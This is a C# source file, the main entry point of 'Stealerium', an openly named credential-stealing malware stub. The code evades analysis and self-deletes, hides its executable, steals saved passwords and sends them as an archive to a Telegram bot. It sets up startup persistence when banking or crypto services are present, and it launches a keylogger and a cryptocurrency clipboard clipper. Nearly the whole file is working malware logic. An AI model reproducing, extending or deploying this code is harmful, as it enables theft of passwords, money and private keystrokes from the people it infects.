using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Modules;
using Stealerium.Stub.Modules.Implant;
using Stealerium.Stub.Target;

namespace Stealerium.Stub
{
    internal class Program
    {
        /// <summary>Defines the entry point of the application.</summary>
        [STAThread]
        private static async Task Main()
        {
            Thread wThread = null, cThread = null;

            // SSL setup
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.DefaultConnectionLimit = 9999;

            // Run AntiAnalysis modules first
            if (AntiAnalysis.Run())
            {
                Logging.Log("AntiAnalysis: Detected suspicious environment. Initiating self-destruct.");
                SelfDestruct.Melt();
            }

            // Mutex check (to avoid running multiple instances)
            MutexControl.Check();

            // Initialize configuration
            await Config.InitAsync();

            // Hide executable on first start
            if (!Startup.IsFromStartup())
                Startup.HideFile();

            // If Telegram API or ID is invalid, self-destruct
            if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
            {
                Logging.Log("SelfDestruct triggered because Telegram API or Telegram ID is invalid.");
                SelfDestruct.Melt();
            }

            // Start delay (if configured)
            if (Config.StartDelay == "1")
                StartDelay.Run();

            // Change working directory to appdata
            Directory.SetCurrentDirectory(Paths.InitWorkDir());

            // Test Telegram API token
            if (!await Telegram.TokenIsValidAsync().ConfigureAwait(false))
            {
                Logging.Log("SelfDestruct triggered because the Telegram API token is invalid.");
                SelfDestruct.Melt();
            }

            // Steal passwords and send the report
            var passwords = await Passwords.SaveAsync();
            var archive = Filemanager.CreateArchive(passwords);
            await Telegram.SendReportAsync(archive).ConfigureAwait(false);

            // Install to startup if necessary and not already installed
            if (Config.Autorun == "1" && !Startup.IsInstalled() && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
            {
                if (!Startup.IsFromStartup())
                    Startup.Install();
            }

            // Run keylogger module if necessary
            if (Config.KeyloggerModule == "1" && Config.Autorun == "1" && (Counter.BankingServices || Counter.Telegram))
            {
                Logging.Log("Starting keylogger modules...");
                wThread = WindowManager.MainThread;
                wThread.SetApartmentState(ApartmentState.STA);
                wThread.Start();
            }

            // Run clipper module if necessary
            if (Config.ClipperModule == "1" && Config.Autorun == "1" && Counter.CryptoServices)
            {
                Logging.Log("Starting clipper modules...");
                cThread = ClipboardManager.MainThread;
                cThread.SetApartmentState(ApartmentState.STA);
                cThread.Start();
            }

            // Wait for threads to finish
            if (wThread != null && wThread.IsAlive)
                wThread.Join();
            if (cThread != null && cThread.IsAlive)
                cThread.Join();

            // Self-destruct if not running from startup
            if (!Startup.IsFromStartup())
            {
                Logging.Log("SelfDestruct triggered because the program was not started from startup.");
                SelfDestruct.Melt();
            }
        }
    }
}
